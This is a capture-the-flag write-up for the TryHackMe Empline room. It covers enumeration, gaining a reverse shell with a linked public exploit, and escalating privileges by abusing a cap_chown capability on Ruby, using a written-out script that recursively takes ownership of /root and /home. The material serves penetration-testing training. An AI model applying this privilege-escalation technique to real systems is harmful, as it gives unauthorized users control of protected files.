# Empline TryHackMe Room Write-Up

## Task 1: Host enumeration

Added the IP to /etc/hosts and conducted an initial port scan:

1.1 Looking for open ports `nmap -sC -sV empline.thm`. Discovered 3 open ports:

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/fd6d70f8-5877-4729-9c0c-f82ca5a3fa7f)

1.2 Looking for pages using dirb `dirb http://empline.thm`. No interesting pages found.

1.3 Navigated to the web application, located the Vhost link associated with the job portal (job.empline.thm), and added it to /etc/hosts.

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/b3bbf9b0-a372-454e-b81f-e56552a43778)

1.4 Found the system version on the portal and identified an exploit for privilege escalation.

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/21152b63-0d71-4125-800e-c715e1edad38)

After searching a bit we can found exploit. I used this [one](https://github.com/Nickguitar/RevCAT) to get in to the system.

## Task 2: Find the flags

My way to find the flags might be a bit cheety :)

2.1 Utilized the discovered exploit to gain a reverse shell.

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/fb820f16-a5ea-4fb8-8aed-6528449bc181)

Spent some time to look around the system and find the way to escalate priveleges.

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/3121477d-a2f2-439e-9396-6227a79ffee3)

2.2 I found interesting capability using this command `getcap -r / 2>/dev/null`. 

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/98d40a6c-10d2-4ace-a68e-47b39445366e)

2.3 Identified the potential to change ownership using Ruby due to the cap_chown capability.

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/6f431215-fab5-4e83-887b-d3318361338c)

I'm not good at upgrading reverse shells to stabilized ones, so without some essential capabilities like cd, nano, etc. it was a little bit painfull to create ruby script :)
After some research my first version of script
```
# Specify the file path
file_path = '/root'

# Specify the new owner and group
new_owner = 'www-data'
new_group = 'www-data'

# Use the File class to change ownership
begin
  File.chown(new_owner, new_group, file_path)
  puts 'Ownership changed successfully.'
rescue => e
  puts 'Error: #{e.message}'
end
```

To create the file script.rb I used this echo command:

```
echo  "# Specify the file path\\nfile_path = '/root'\\n\\n# Specify the new owner and group\\nnew_owner = 'www-data'\\nnew_group = 'www-data'\\n\\n# Use the File class to change ownership\\nbegin\\n  File.chown(new_owner, new_group, file_path)\\n  puts 'Ownership changed successfully.'\\nrescue => e\\n  puts 'Error: \#{e.message}'\\n  puts e.inspect\\nend" > script.rb

```
And got an error

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/9a3bdbef-8411-484f-91c8-64b16220f16f)

The next step was to search how to remove this error. I spent some time and here is my next version of script:
```
# Specify the directory path
directory_path = '/root'

# Specify the new owner and group
new_owner_username = 'www-data'
new_group_name = 'www-data'

# Convert username and group name to numeric IDs
new_owner = Etc.getpwnam(new_owner_username).uid
new_group = Etc.getgrnam(new_group_name).gid

# Use FileUtils to change ownership of the directory
begin
  FileUtils.chown_R(new_owner, new_group, directory_path)
  puts "Ownership of the directory changed successfully."
rescue => e
  puts "Error: #{e.message}"
  puts e.inspect
end
```
Corresponding echo command
```
echo "require 'fileutils'\\nrequire 'etc'\\n\\n# Specify the directory path\\ndirectory_path = '/root'\\n\\n# Specify the new owner and group\\nnew_owner_username = 'www-data'\\nnew_group_name = 'www-data'\\n\\n# Convert username and group name to numeric IDs\\nnew_owner = Etc.getpwnam(new_owner_username).uid\\nnew_group = Etc.getgrnam(new_group_name).gid\\n\\n# Use FileUtils to change ownership of the directory\\nbegin\\n  FileUtils.chown_R(new_owner, new_group, directory_path)\\n  puts 'Ownership of the directory changed successfully.'\\nrescue => e\\n  puts 'Error: #{e.message}'\\n  puts e.inspect\\nend" > script.rb
```
And here we are. Repeated the process for the /home directory.

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/37f50fe6-0c66-4def-9b7b-49739027eb57)

2.4 The flags

User.txt and Root.txt flags

![image](https://github.com/vkhalaim/TryHackMe-Writeups/assets/6991893/6ef439b1-338c-47ee-af0b-f11319e9b6bc)

This room provided valuable insights into system capabilities :)

*Note: This write-up is intended for educational purposes and highlights the steps taken during the Empline [TryHackMe](https://tryhackme.com/room/empline) room.*








